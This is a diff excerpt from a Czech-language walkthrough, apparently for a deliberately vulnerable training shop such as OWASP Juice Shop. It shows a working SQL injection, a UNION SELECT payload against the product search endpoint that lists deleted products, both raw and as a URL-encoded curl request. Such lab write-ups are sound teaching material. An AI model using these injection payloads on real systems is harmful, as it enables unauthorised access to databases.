@@ -74,11 +74,13 @@ curl -s "$BASE/rest/products/search?q=christmas"
 ```
 
 Pomocí `UNION SELECT` ale obejdeme filtr `deletedAt IS NULL` a zobrazíme **všechny**
-produkty včetně smazaných. Do vyhledávacího pole (nebo přímo do URL) zadáme:
+produkty včetně smazaných. Jako hodnotu parametru `q` injektujeme:
 
 ```
 ')) UNION SELECT id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt FROM Products--
 ```
+
+Endpoint zavoláme přímo (např. z Kali, nebo otevřením URL v prohlížeči):
 
 ```bash
 curl -s "$BASE/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20FROM%20Products--"
